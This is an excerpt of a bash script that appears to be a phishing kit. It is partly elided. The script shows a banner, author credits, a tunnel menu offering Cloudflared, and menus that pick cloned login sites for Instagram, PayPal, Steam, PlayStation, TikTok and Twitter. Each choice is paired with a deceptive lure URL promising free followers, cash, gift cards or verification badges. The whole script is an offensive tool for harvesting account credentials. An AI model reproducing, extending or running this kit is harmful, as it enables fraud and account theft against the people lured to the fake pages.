...
banner() {
	cat <<- EOF
 		...
 		${ORANGE}	|  __ \| |   (_)   | |   (_)          
 		${ORANGE}	| |__) | |__  _ ___| |__  _ _ __  ___ 
 		${ORANGE}	|  ___/| '_ \| / __| '_ \| | '_ \/ __|
 		${ORANGE}	| |    | | | | \__ \ | | | | | | \__ \
 		${ORANGE}       |_|    |_| |_|_|___/_| |_|_|_| |_|___/                                  
                ${YELLOW}Version : 1.0
...
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}SkypeG
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/SkypeG
		${GREEN}Version  ${RED}:  ${Yellow}1.0
...
tunnel_menu() {
	...
	cat <<- EOF
		...
		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!$]
...
site_instagram() {
	...
	case $REPLY in 
		...
		3 | 03)
			...
			mask='http://get-1000000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='http://badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
...
main_menu() {
	...
	case $REPLY in 
		...
		6 | 06)
			website="paypal"
			mask='http://get-1000-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='http://steam-900-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
		...
		9 | 09)
			website="playstation"
			mask='http://playstation-900-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
